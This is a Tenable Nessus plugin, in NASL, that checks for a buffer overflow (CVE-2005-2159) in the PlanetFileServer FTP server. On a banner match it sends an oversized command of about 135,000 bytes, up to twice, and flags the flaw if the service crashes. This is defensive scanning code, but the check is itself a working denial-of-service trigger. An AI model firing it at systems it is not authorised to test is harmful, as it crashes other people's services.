#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(18611);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2005-2159");
  script_bugtraq_id(14138);
  script_xref(name:"OSVDB", value:"17820");

  script_name(english:"PlanetFileServer mshftp.dll Data Processing Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is prone to a buffer overflow attack." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running PlanetFileServer, an FTP server
for Windows from PlanetDNS. 

The installed version of PlanetFileServer is vulnerable to a buffer
overflow when processing large commands.  An unauthenticated attacker
can trigger this flaw to crash the service or execute arbitrary code
as administrator." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/404161/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
script_end_attributes();

 
  summary["english"] = "Checks for remote buffer overflow vulnerability in PlanetFileServer";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_overflow.nasl");
  script_exclude_keys("ftp/false_ftp", "ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# If the banner suggests it's for PlanetFileServer...
banner = get_ftp_banner(port: port);
if (
  banner && 
  egrep(string:banner, pattern:"^220[ -]mshftp/.+ NewAce Corporation")
) {
  c = string(crap(135000), "\r\n");

  # nb: fRoGGz claims you may need to send the command 2 times
  #     depending on the configured security filter option levels.
  i = 0;
  while((soc = open_sock_tcp(port)) && i++ < 2) {
    # Send a long command.
    send(socket:soc, data:c);
    close(soc);
    sleep(1);
  }

  # There's a problem if we can't open a connection after sending 
  # the exploit at least once.
  if (!soc && i > 0) {
    security_hole(port);
    exit(0);
  }
}
